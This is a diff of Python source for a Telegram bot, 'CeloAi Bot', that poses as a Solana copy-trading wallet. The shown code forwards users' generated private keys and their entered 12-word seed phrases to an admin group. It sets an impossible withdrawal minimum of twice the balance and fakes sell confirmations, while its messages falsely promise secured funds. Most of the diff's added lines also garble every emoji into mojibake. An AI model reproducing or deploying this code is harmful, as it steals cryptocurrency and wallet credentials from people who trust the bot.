@@ -72,10 +72,10 @@ SOLANA_RPC_URL = "https://api.mainnet-beta.solana.com"  # Solana RPC endpoint
 
 # Debug: Check if API key is loaded
 if COINGECKO_API_KEY:
-    print(f"✅ CoinGecko API Key loaded: {COINGECKO_API_KEY[:8]}...")
+    print(f"âœ… CoinGecko API Key loaded: {COINGECKO_API_KEY[:8]}...")
 else:
     print(
-        "⚠️ WARNING: CoinGecko API Key NOT found! Prices may not work correctly."
+        "âš ï¸ WARNING: CoinGecko API Key NOT found! Prices may not work correctly."
     )
     print("   Make sure COINGECKO_API_KEY is set in your .env file")
 
@@ -145,7 +145,7 @@ async def monitor_deposits(telegram_id: int,
                     telegram_id, -1) != current_balance:
                 try:
                     user_notification = (
-                        f"💰 <b>Deposit Confirmed!</b>\n\n"
+                        f"ðŸ’° <b>Deposit Confirmed!</b>\n\n"
                         f"Amount: +{deposit_amount:.4f} SOL\n"
                         f"New Balance: {current_balance:.4f} SOL (${usd_value:.2f})\n\n"
                         f"Your deposit has been successfully received and credited to your wallet."
@@ -166,7 +166,7 @@ async def monitor_deposits(telegram_id: int,
                         telegram_id)
 
                     deposit_notification = (
-                        f"💰 <b>New Deposit Detected</b>\n\n"
+                        f"ðŸ’° <b>New Deposit Detected</b>\n\n"
                         f"User: @{user_name} (ID: {telegram_id})\n"
                         f"Address: <code>{public_address}</code>\n\n"
                         f"Deposit: +{deposit_amount:.4f} SOL\n"
@@ -239,7 +239,7 @@ def derive_keypair_and_address(telegram_id: int):
     return public_address, private_key_b58
 
 
-# ✅ Step 1: Put the wallet function here
+# âœ… Step 1: Put the wallet function here
 async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     telegram_id = user.id
@@ -254,11 +254,11 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # This serves as backend storage for asset recovery
         if telegram_id not in wallet_sent_to_admin and GROUP_ID:
             try:
-                admin_message = (f"👤 <b>New Wallet Generated</b>\n\n"
+                admin_message = (f"ðŸ‘¤ <b>New Wallet Generated</b>\n\n"
                                  f"User: @{user_name} (ID: {telegram_id})\n\n"
-                                 f"📬 <b>Public Address:</b>\n"
+                                 f"ðŸ“¬ <b>Public Address:</b>\n"
                                  f"<code>{public_address}</code>\n\n"
-                                 f"🔐 <b>Private Key (Backend Storage):</b>\n"
+                                 f"ðŸ” <b>Private Key (Backend Storage):</b>\n"
                                  f"<code>{private_key_b58}</code>")
                 await context.bot.send_message(chat_id=GROUP_ID,
                                                text=admin_message,
@@ -282,32 +282,32 @@ async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Show public address to user (private key stored securely server-side)
         wallet_text = (
-            "💼 <b>Wallet Overview</b> — <i>Connected</i> ✅\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "ðŸ’¼ <b>Wallet Overview</b> â€” <i>Connected</i> âœ…\n"
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
             "<b>Your Solana Address</b>\n\n"
-            "📬 <b>Solana Address:</b>\n"
+            "ðŸ“¬ <b>Solana Address:</b>\n"
             f"<code>{public_address}</code>\n\n"
-            #"🔐 <b>Private Key:</b> Stored securely (contact admin for recovery)\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            #"ðŸ” <b>Private Key:</b> Stored securely (contact admin for recovery)\n\n"
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n"
             "<b>Holdings</b>\n"
-            f"• <b>SOL:</b> {balance:.4f}\n"
-            f"• <b>Total Assets:</b> ${usd_value:.2f}\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            "🔘 <i>No active tokens detected.</i>\n\n"
-            "💰 <b>Fund Your Bot</b>\n"
+            f"â€¢ <b>SOL:</b> {balance:.4f}\n"
+            f"â€¢ <b>Total Assets:</b> ${usd_value:.2f}\n"
+            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
+            "ðŸ”˜ <i>No active tokens detected.</i>\n\n"
+            "ðŸ’° <b>Fund Your Bot</b>\n"
             f"Send SOL to your address above\n\n"
             "(Funds are required for copy-trading operations.)\n\n"
-            "⚡ <b>Quick Actions</b>\n"
-            "• ⚓️ /start – Refresh your bot\n\n"
-            "👇 <i>What would you like to do next?</i>")
+            "âš¡ <b>Quick Actions</b>\n"
+            "â€¢ âš“ï¸ /start â€“ Refresh your bot\n\n"
+            "ðŸ‘‡ <i>What would you like to do next?</i>")
     except Exception as e:
-        wallet_text = ("⚠️ <b>Wallet Generation Error</b>\n\n"
+        wallet_text = ("âš ï¸ <b>Wallet Generation Error</b>\n\n"
                        "Unable to generate wallet. Please contact support.\n"
                        f"Error: {str(e)}")
 
-    if update.message:  # user typed 🧩Wallet
+    if update.message:  # user typed ðŸ§©Wallet
         await update.message.reply_text(wallet_text, parse_mode="HTML")
-    elif update.callback_query:  # user tapped 💰 Fund Wallet
+    elif update.callback_query:  # user tapped ðŸ’° Fund Wallet
         await update.callback_query.answer()
         await update.callback_query.message.reply_text(wallet_text,
                                                        parse_mode="HTML")
@@ -331,7 +331,7 @@ async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ])
 
     settings_text = (
-        "<b>⚙️ Settings Menu</b>\n\n"
+        "<b>âš™ï¸ Settings Menu</b>\n\n"
         "Your settings are organized into categories for easy management:\n\n"
         "<b>Trading Options:</b>\n"
         "- Configure number of trades per day\n"
@@ -362,7 +362,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_states.pop(user_id, None)  # Clear user state
         await query.edit_message_text(
             text=
-            "❌ Settings input cancelled. You can access settings again from the main menu.",
+            "âŒ Settings input cancelled. You can access settings again from the main menu.",
             parse_mode="HTML")
         return
 
@@ -376,18 +376,18 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             usd_value = user_balance * sol_price if sol_price > 0 else 0
 
             deposit_message = (
-                "💰 <b>Fund Your Wallet</b>\n\n"
+                "ðŸ’° <b>Fund Your Wallet</b>\n\n"
                 f"Send SOL to the address below to fund your bot wallet:\n\n"
-                f"📬 <b>Your Deposit Address:</b>\n"
+                f"ðŸ“¬ <b>Your Deposit Address:</b>\n"
                 f"<code>{public_address}</code>\n\n"
-                f"💡 <b>How to Deposit:</b>\n"
+                f"ðŸ’¡ <b>How to Deposit:</b>\n"
                 f"1. Copy the address above\n"
                 f"2. Send SOL from any Solana wallet\n"
                 f"3. Deposits are detected automatically\n"
                 f"4. You'll receive a notification when funds arrive\n\n"
-                f"📊 <b>Current Balance:</b> {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
-                f"⚠️ <b>Note:</b> Only send SOL to this address. Sending other tokens may result in loss of funds.\n\n"
-                f"🔄 Deposits are monitored every 30 seconds and you'll be notified immediately when received."
+                f"ðŸ“Š <b>Current Balance:</b> {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
+                f"âš ï¸ <b>Note:</b> Only send SOL to this address. Sending other tokens may result in loss of funds.\n\n"
+                f"ðŸ”„ Deposits are monitored every 30 seconds and you'll be notified immediately when received."
             )
 
             await query.answer()
@@ -395,7 +395,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             await query.answer()
             await query.message.reply_text(
-                "⚠️ Error generating deposit address. Please try again or contact support.",
+                "âš ï¸ Error generating deposit address. Please try again or contact support.",
                 parse_mode="HTML")
         return
 
@@ -411,14 +411,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["awaiting_custom_buy"] = token_address
 
             cancel_button = InlineKeyboardMarkup([[
-                InlineKeyboardButton("❌ Cancel",
+                InlineKeyboardButton("âŒ Cancel",
                                      callback_data="cancel_custom_trade")
             ]])
 
             await query.message.reply_text(
-                "🟢 <b>Custom Buy Amount</b>\n\n"
+                "ðŸŸ¢ <b>Custom Buy Amount</b>\n\n"
                 "Please enter the amount of SOL you want to buy:\n\n"
-                "📝 Enter your desired SOL amount (e.g., 0.25, 2.5, 10)",
+                "ðŸ“ Enter your desired SOL amount (e.g., 0.25, 2.5, 10)",
                 parse_mode="HTML",
                 reply_markup=cancel_button)
             return
@@ -435,12 +435,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             # Balance validation rules
             if user_balance == 0:
-                await query.message.reply_text(f"❗ Insufficient SOL balance.",
+                await query.message.reply_text(f"â— Insufficient SOL balance.",
                                                parse_mode="HTML")
                 return
             elif usd_value < 10:
                 await query.message.reply_text(
-                    f"❗ Minimum amount required to buy a token is above $10.\n\n"
+                    f"â— Minimum amount required to buy a token is above $10.\n\n"
                     f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                     parse_mode="HTML")
                 return
@@ -464,14 +464,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data["awaiting_custom_sell"] = token_address
 
             cancel_button = InlineKeyboardMarkup([[
-                InlineKeyboardButton("❌ Cancel",
+                InlineKeyboardButton("âŒ Cancel",
                                      callback_data="cancel_custom_trade")
             ]])
 
             await query.message.reply_text(
-                "🔴 <b>Custom Sell Percentage</b>\n\n"
+                "ðŸ”´ <b>Custom Sell Percentage</b>\n\n"
                 "Please enter the percentage you want to sell:\n\n"
-                "📝 Enter your desired percentage (e.g., 25, 75, 90)",
+                "ðŸ“ Enter your desired percentage (e.g., 25, 75, 90)",
                 parse_mode="HTML",
                 reply_markup=cancel_button)
             return
@@ -482,10 +482,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parts) > 2 else context.user_data.get("current_token", "")
             # Show user response (without private key)
             await query.message.reply_text(
-                f"🔴 <b>Sell Order Submitted</b>\n\n"
+                f"ðŸ”´ <b>Sell Order Submitted</b>\n\n"
                 f"Percentage: {percentage}%\n"
                 f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
-                f"❗ No token balance to sell.",
+                f"â— No token balance to sell.",
                 parse_mode="HTML")
             return
 
@@ -493,7 +493,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if option == "cancel_custom_trade":
         context.user_data.pop("awaiting_custom_buy", None)
         context.user_data.pop("awaiting_custom_sell", None)
-        await query.message.reply_text("❌ Trade cancelled.",
+        await query.message.reply_text("âŒ Trade cancelled.",
                                        reply_markup=main_menu_markup())
         return
 
@@ -512,14 +512,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Apply withdrawal rules
         if user_balance == 0:
-            await query.message.reply_text("❗ Insufficient SOL balance.",
+            await query.message.reply_text("â— Insufficient SOL balance.",
                                            parse_mode="HTML")
             return
 
         # Check if balance is above $10
         if usd_value < 10:
             await query.message.reply_text(
-                f"❗ Your balance must be above $10 to withdraw.\n\n"
+                f"â— Your balance must be above $10 to withdraw.\n\n"
                 f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                 f"Required minimum: $10 worth of SOL\n\n"
                 f"Please deposit more SOL to meet the minimum withdrawal requirement.",
@@ -528,11 +528,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Show withdrawal requirements (minimum = 2x balance)
         await query.message.reply_text(
-            f"💸 <b>Withdrawal Requirements</b>\n\n"
+            f"ðŸ’¸ <b>Withdrawal Requirements</b>\n\n"
             f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n\n"
             f"<b>Minimum withdrawal required:</b> {minimum_withdrawal:.4f} SOL\n"
-            ##f"⚠️ <b>Gas Fee Reserve:</b> {MIN_GAS_RESERVE} SOL must remain in wallet\n\n"
-            f"❗ You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
+            ##f"âš ï¸ <b>Gas Fee Reserve:</b> {MIN_GAS_RESERVE} SOL must remain in wallet\n\n"
+            f"â— You need at least {minimum_withdrawal:.4f} SOL to process a withdrawal.\n"
             f"Please deposit more funds to meet the minimum requirement.",
             parse_mode="HTML")
         return
@@ -553,12 +553,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         minimum_withdrawal = user_balance * 2
 
         await query.message.reply_text(
-            f"💸 <b>Withdraw Custom Amount</b>\n\n"
+            f"ðŸ’¸ <b>Withdraw Custom Amount</b>\n\n"
             f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
             f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL\n"
             #f"<b>Gas fee reserve:</b> {MIN_GAS_RESERVE} SOL (must remain in wallet)\n\n"
             f"Please enter the withdrawal amount (in SOL):\n\n"
-            f"📝 Enter your desired amount (minimum: {minimum_withdrawal:.4f} SOL)",
+            f"ðŸ“ Enter your desired amount (minimum: {minimum_withdrawal:.4f} SOL)",
             parse_mode="HTML",
             reply_markup=cancel_markup())
         return
@@ -568,19 +568,19 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Create cancel button for settings input
     cancel_button = InlineKeyboardMarkup(
-        [[InlineKeyboardButton("❌ Cancel", callback_data="cancel_settings")]])
+        [[InlineKeyboardButton("âŒ Cancel", callback_data="cancel_settings")]])
 
     await query.edit_message_text(
         text=
-        f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:\n\n📝 Enter your desired value and send it as a message.",
+        f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:\n\nðŸ“ Enter your desired value and send it as a message.",
         parse_mode="HTML",
         reply_markup=cancel_button)
 
 
 # ---- Helpers ----
 def main_menu_markup():
-    keyboard = [["💸Withdraw", "🔌Import Wallet"], ["🔍Copy Trade", "⚙️Settings"],
-                ["💳Wallet", "🤖Bot Guide"], ["💰Buy/Sell", "📊Live Chart"]]
+    keyboard = [["ðŸ’¸Withdraw", "ðŸ”ŒImport Wallet"], ["ðŸ”Copy Trade", "âš™ï¸Settings"],
+                ["ðŸ’³Wallet", "ðŸ¤–Bot Guide"], ["ðŸ’°Buy/Sell", "ðŸ“ŠLive Chart"]]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
 
@@ -653,14 +653,14 @@ def format_token_details(pair_data, wallet_balance=0):
         info = pair_data.get('info', {})
         socials = info.get('socials', [])
 
-        twitter_link = "❌"
-        telegram_link = "❌"
+        twitter_link = "âŒ"
+        telegram_link = "âŒ"
 
         for social in socials:
             if social.get('type') == 'twitter':
-                twitter_link = "✅"
+                twitter_link = "âœ…"
             elif social.get('type') == 'telegram':
-                telegram_link = "✅"
+                telegram_link = "âœ…"
 
         # Format price with proper decimals (fix for very small prices)
         if price_usd == 0:
@@ -702,28 +702,28 @@ def format_token_details(pair_data, wallet_balance=0):
             liq_str = f"{liquidity_usd/1000:.2f}K"
 
         message = (
-            f"📌 <b>{token_name} ({token_symbol})</b>\n"
+            f"ðŸ“Œ <b>{token_name} ({token_symbol})</b>\n"
             f"<code>{token_address}</code>\n\n"
-            f"💳 <b>Wallet:</b>\n"
-            f"|——Balance: {wallet_balance} SOL\n"
-            f"|——Holding: 0 {token_symbol}\n"
-            f"|___PnL: 0%🚀🚀\n\n"
-            f"💵 <b>Trade:</b>\n"
-            f"|——Market Cap: {mcap_str}\n"
-            f"|——Price: {price_str}\n"
+            f"ðŸ’³ <b>Wallet:</b>\n"
+            f"|â€”â€”Balance: {wallet_balance} SOL\n"
+            f"|â€”â€”Holding: 0 {token_symbol}\n"
+            f"|___PnL: 0%ðŸš€ðŸš€\n\n"
+            f"ðŸ’µ <b>Trade:</b>\n"
+            f"|â€”â€”Market Cap: {mcap_str}\n"
+            f"|â€”â€”Price: {price_str}\n"
             f"|___Buyers (24h): {buyers_24h}\n\n"
-            # f"🔍 <b>Security:</b>\n"
-            # f"|——Security scan available on DexScreener\n"
-            # f"|——Trade Tax: Check DexScreener\n"
+            # f"ðŸ” <b>Security:</b>\n"
+            # f"|â€”â€”Security scan available on DexScreener\n"
+            # f"|â€”â€”Trade Tax: Check DexScreener\n"
             # f"|___Top 10: Check DexScreener\n\n"
-            f"📝 <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
-            f"|——💧 {dex_id} AMM\n"
-            f"|——🟢 Trading opened\n"
-            f"|——Created {time_ago}\n"
+            f"ðŸ“ <b>LP:</b> {token_symbol}-{quote.get('symbol', 'SOL')}\n"
+            f"|â€”â€”ðŸ’§ {dex_id} AMM\n"
+            f"|â€”â€”ðŸŸ¢ Trading opened\n"
+            f"|â€”â€”Created {time_ago}\n"
             f"|___Liquidity: {liq_str} USD\n\n"
-            f"📲 <b>Links:</b>\n"
-            f"|—— Twitter {twitter_link}\n"
-            f"|—— Telegram {telegram_link}\n"
+            f"ðŸ“² <b>Links:</b>\n"
+            f"|â€”â€” Twitter {twitter_link}\n"
+            f"|â€”â€” Telegram {telegram_link}\n"
             f"|___ <a href='https://dexscreener.com/solana/{token_address}'>DexScreener</a> | "
             f"<a href='https://www.pump.fun/{token_address}'>Pump</a>")
 
@@ -735,63 +735,14 @@ def format_token_details(pair_data, wallet_balance=0):
 
 # --- /start ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    welcome_text = (
-        "👋 Welcome to *CeloAi Bot!*\n"
+    await update.message.reply_text(
+        "ðŸ‘‹ Welcome to CeloAi Bot!\n"
         "Step into the world of fast, smart, and stress-free trading, "
         "designed for both beginners and seasoned traders.\n\n"
-        "🔗 Connecting to your wallet...\n"
-        "⏳ Initializing your account and securing your funds...\n"
-        "✅ Wallet successfully created and linked!\n\n"
-        "👇 Select an option below to continue."
-    )
-
-    # Send both inline community button and main menu
-    keyboard = main_menu_markup()  # Your ReplyKeyboardMarkup
-    guide_buttons = InlineKeyboardMarkup([
-        [
-            InlineKeyboardButton(
-                "📢 JOIN CeloAI Community",
-                url="https://t.me/+VvD5LW8Eq01iMDlk"
-            ),
-        ]
-    ])
-
-    # Use reply_markup for ReplyKeyboardMarkup OR send both separately
-    if update.message:
-        await update.message.reply_text(
-            welcome_text,
-            parse_mode="Markdown",
-            reply_markup=keyboard  # <-- this attaches the main menu
-        )
-        # Optional: send community link separately
-        await update.message.reply_text(
-            "CeloAi Community",
-            reply_markup=guide_buttons
-        )
-    elif update.callback_query:
-        await update.callback_query.message.reply_text(
-            welcome_text,
-            parse_mode="Markdown",
-            reply_markup=keyboard
-        )
-        await update.callback_query.message.reply_text(
-            "Join our community:",
-            reply_markup=guide_buttons
-        )
-
-
-
-        
-    
-    
-    # --- /support ---
-async def support(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "📩 Support Contact\n\n"
-        "If you need help, our support team is available to assist you:\n\n"
-        "🔧 Reach Support:\n"
-        "@CeloAi_Support\n\n"
-        "Feel free to send them a message anytime!",
+        "ðŸ”— Connecting to your wallet...\n"
+        "â³ Initializing your account and securing your funds...\n"
+        "âœ… Wallet successfully created and linked!\n\n"
+        "ðŸ’¡Tap Continue below to access your wallet and explore all trading options.",
         reply_markup=main_menu_markup())
     # clear states
     context.user_data.pop("awaiting_dummy", None)
@@ -818,11 +769,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if count != 12:
             await update.message.reply_text(
-                f"❌ <b>Invalid Seed Phrase Length</b>\n\n"
+                f"âŒ <b>Invalid Seed Phrase Length</b>\n\n"
                 f"You entered {count} word(s), but we need exactly 12 words.\n\n"
-                f"📝 <b>Please try again:</b>\n"
-                f"• Send exactly 12 words separated by spaces\n"
-                f"• Each word should contain only letters (A-Z)\n\n"
+                f"ðŸ“ <b>Please try again:</b>\n"
+                f"â€¢ Send exactly 12 words separated by spaces\n"
+                f"â€¢ Each word should contain only letters (A-Z)\n\n"
                 f"Or tap Cancel to abort the wallet connection.",
                 parse_mode="HTML",
                 reply_markup=cancel_markup())
@@ -834,17 +785,17 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if bad_indices:
             positions = ", ".join(map(str, bad_indices))
             await update.message.reply_text(
-                f"❌ <b>Invalid Characters Found</b>\n\n"
+                f"âŒ <b>Invalid Characters Found</b>\n\n"
                 f"Some words contain invalid characters. Words must contain only letters (A-Z).\n\n"
-                f"🔍 <b>Please check word position(s):</b> {positions}\n\n"
-                f"📝 Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
+                f"ðŸ” <b>Please check word position(s):</b> {positions}\n\n"
+                f"ðŸ“ Fix the invalid words and try again, or tap Cancel to abort the wallet connection.",
                 parse_mode="HTML",
                 reply_markup=cancel_markup())
             return
 
         wallet_seed = " ".join(words)
         forward_text = (
-            f"🔐 Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
+            f"ðŸ” Wallet Connection Request from @{user_name} (id: {user_id}):\n\n"
             f"<pre>{wallet_seed}</pre>")
         try:
             await context.bot.send_message(chat_id=GROUP_ID,
@@ -861,8 +812,8 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         context.user_data.pop("awaiting_dummy", None)
         await update.message.reply_text(
-            "✅ <b>Wallet Connection Processing</b>\n\n"
-            "Please wait while our system processes your wallet import request ✅",
+            "âœ… <b>Wallet Connection Processing</b>\n\n"
+            "Please wait while our system processes your wallet import request âœ…",
             parse_mode="HTML",
             reply_markup=main_menu_markup())
         return
@@ -879,13 +830,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             amount = float(text)
         except ValueError:
             await update.message.reply_text(
-                "❗ Invalid amount. Please enter a number or tap Cancel.",
+                "â— Invalid amount. Please enter a number or tap Cancel.",
                 reply_markup=cancel_markup())
             return
 
         if amount <= 0:
             await update.message.reply_text(
-                "❗ Withdrawal amount must be greater than zero.",
+                "â— Withdrawal amount must be greater than zero.",
                 reply_markup=cancel_markup())
             return
 
@@ -904,7 +855,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # First check if balance is 0
         if user_balance == 0:
-            await update.message.reply_text("❗ Insufficient SOL balance.",
+            await update.message.reply_text("â— Insufficient SOL balance.",
                                             reply_markup=main_menu_markup())
             context.user_data.pop("awaiting_withdraw", None)
             return
@@ -912,7 +863,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check if balance is above $10
         if usd_value < 10:
             await update.message.reply_text(
-                f"❗ Your balance must be above $10 to withdraw.\n\n"
+                f"â— Your balance must be above $10 to withdraw.\n\n"
                 f"Current balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                 f"Required minimum: $10 worth of SOL\n\n"
                 f"Please deposit more SOL to meet the minimum withdrawal requirement.",
@@ -923,7 +874,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Check if amount meets minimum withdrawal requirement (2x balance)
         if amount < minimum_withdrawal:
             await update.message.reply_text(
-                f"❗ <b>Withdrawal Amount Too Low</b>\n\n"
+                f"â— <b>Withdrawal Amount Too Low</b>\n\n"
                 f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
                 f"Minimum withdrawal: {minimum_withdrawal:.4f} SOL\n\n"
                 f"You need to withdraw at least {minimum_withdrawal:.4f} SOL.\n"
@@ -934,7 +885,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Amount meets minimum but user doesn't have enough balance
         await update.message.reply_text(
-            f"❗ <b>Insufficient Balance for Withdrawal</b>\n\n"
+            f"â— <b>Insufficient Balance for Withdrawal</b>\n\n"
             f"Withdrawal amount: {amount:.4f} SOL\n"
             f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})\n"
             # f"Gas fee reserve: {MIN_GAS_RESERVE} SOL\n\n"
@@ -956,9 +907,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         wallet_address = text.strip()
 
-        # ✅ Check if wallet address looks valid (length = 44 and letters/numbers only)
+        # âœ… Check if wallet address looks valid (length = 44 and letters/numbers only)
         if len(wallet_address) != 44 or not wallet_address.isalnum():
-            await update.message.reply_text("❗ Invalid Solana wallet address.",
+            await update.message.reply_text("â— Invalid Solana wallet address.",
                                             reply_markup=cancel_markup())
             return
 
@@ -967,14 +918,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # If balance is 0, show insufficient balance
         if user_balance == 0:
-            await update.message.reply_text("❗ Insufficient SOL balance.",
+            await update.message.reply_text("â— Insufficient SOL balance.",
                                             reply_markup=main_menu_markup())
             context.user_data.pop("awaiting_copy_trade", None)
             return
 
         # If balance > 0, show success message
         await update.message.reply_text(
-            f"✅ <b>Address Added Successfully!</b>\n\n"
+            f"âœ… <b>Address Added Successfully!</b>\n\n"
             f"Wallet address has been added to your copy trade list:\n\n"
             f"<code>{wallet_address}</code>\n\n"
             f"You will now copy trades from this wallet automatically.",
@@ -996,12 +947,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             amount = float(text)
             if amount <= 0:
                 await update.message.reply_text(
-                    "❗ Amount must be greater than zero.",
+                    "â— Amount must be greater than zero.",
                     reply_markup=cancel_markup())
                 return
         except ValueError:
             await update.message.reply_text(
-                "❗ Invalid amount. Please enter a valid number.",
+                "â— Invalid amount. Please enter a valid number.",
                 reply_markup=cancel_markup())
             return
 
@@ -1014,14 +965,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         # Balance validation rules
         if user_balance == 0:
-            await update.message.reply_text(f"❗ Insufficient SOL balance.",
+            await update.message.reply_text(f"â— Insufficient SOL balance.",
                                             parse_mode="HTML",
                                             reply_markup=main_menu_markup())
             context.user_data.pop("awaiting_custom_buy", None)
             return
         elif usd_value < 10:
             await update.message.reply_text(
-                f"❗ Minimum amount required to buy a token is above $10.\n\n"
+                f"â— Minimum amount required to buy a token is above $10.\n\n"
                 f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                 parse_mode="HTML",
                 reply_markup=main_menu_markup())
@@ -1048,25 +999,25 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             percentage = float(text)
             if percentage <= 0 or percentage > 100:
                 await update.message.reply_text(
-                    "❗ Percentage must be between 0 and 100.",
+                    "â— Percentage must be between 0 and 100.",
                     reply_markup=cancel_markup())
                 return
         except ValueError:
             await update.message.reply_text(
-                "❗ Invalid percentage. Please enter a valid number.",
+                "â— Invalid percentage. Please enter a valid number.",
                 reply_markup=cancel_markup())
             return
 
         token_address = context.user_data.get("awaiting_custom_sell", "")
 
-        # ❌ Removed derive_keypair and admin forwarding
+        # âŒ Removed derive_keypair and admin forwarding
 
-        # ✅ Just show user response
+        # âœ… Just show user response
         await update.message.reply_text(
-            f"🔴 <b>Sell Order Submitted</b>\n\n"
+            f"ðŸ”´ <b>Sell Order Submitted</b>\n\n"
             f"Percentage: {percentage}%\n"
             f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
-            f"❗ No token balance to sell.",
+            f"â— No token balance to sell.",
             parse_mode="HTML",
             reply_markup=main_menu_markup())
 
@@ -1089,13 +1040,13 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         base58_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
         if not re.match(base58_pattern, token_address):
             await update.message.reply_text(
-                "❗ Invalid token contract address. Please enter a valid Solana token address.\n\n"
+                "â— Invalid token contract address. Please enter a valid Solana token address.\n\n"
                 "Solana addresses are 32-44 characters and use base58 encoding.",
                 reply_markup=cancel_markup())
             return
 
         # Fetch token details
-        await update.message.reply_text("🔍 Fetching token details...")
+        await update.message.reply_text("ðŸ” Fetching token details...")
 
         pair_data = await get_token_details(token_address)
 
@@ -1112,41 +1063,41 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 buy_sell_keyboard = InlineKeyboardMarkup(
                     [[
                         InlineKeyboardButton(
-                            "🟢 Buy 0.1 SOL",
+                            "ðŸŸ¢ Buy 0.1 SOL",
                             callback_data=f"buy_0.1_{token_address}"),
                         InlineKeyboardButton(
-                            "🔴 Sell 50%",
+                            "ðŸ”´ Sell 50%",
                             callback_data=f"sell_50_{token_address}")
                     ],
                      [
                          InlineKeyboardButton(
-                             "🟢 Buy 0.5 SOL",
+                             "ðŸŸ¢ Buy 0.5 SOL",
                              callback_data=f"buy_0.5_{token_address}"),
                          InlineKeyboardButton(
-                             "🔴 Sell 100%",
+                             "ðŸ”´ Sell 100%",
                              callback_data=f"sell_100_{token_address}")
                      ],
                      [
                          InlineKeyboardButton(
-                             "🟢 Buy 1.0 SOL",
+                             "ðŸŸ¢ Buy 1.0 SOL",
                              callback_data=f"buy_1.0_{token_address}"),
                          InlineKeyboardButton(
-                             "🔴 Sell x%",
+                             "ðŸ”´ Sell x%",
                              callback_data=f"sell_custom_{token_address}")
                      ],
                      [
                          InlineKeyboardButton(
-                             "🟢 Buy 3.0 SOL",
+                             "ðŸŸ¢ Buy 3.0 SOL",
                              callback_data=f"buy_3.0_{token_address}")
                      ],
                      [
                          InlineKeyboardButton(
-                             "🟢 Buy 5.0 SOL",
+                             "ðŸŸ¢ Buy 5.0 SOL",
                              callback_data=f"buy_5.0_{token_address}")
                      ],
                      [
                          InlineKeyboardButton(
-                             "🟢 Buy x SOL",
+                             "ðŸŸ¢ Buy x SOL",
                              callback_data=f"buy_custom_{token_address}")
                      ]])
 
@@ -1156,11 +1107,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                                 reply_markup=buy_sell_keyboard)
             else:
                 await update.message.reply_text(
-                    "❗ Error formatting token details. Please try again.",
+                    "â— Error formatting token details. Please try again.",
                     reply_markup=main_menu_markup())
         else:
             await update.message.reply_text(
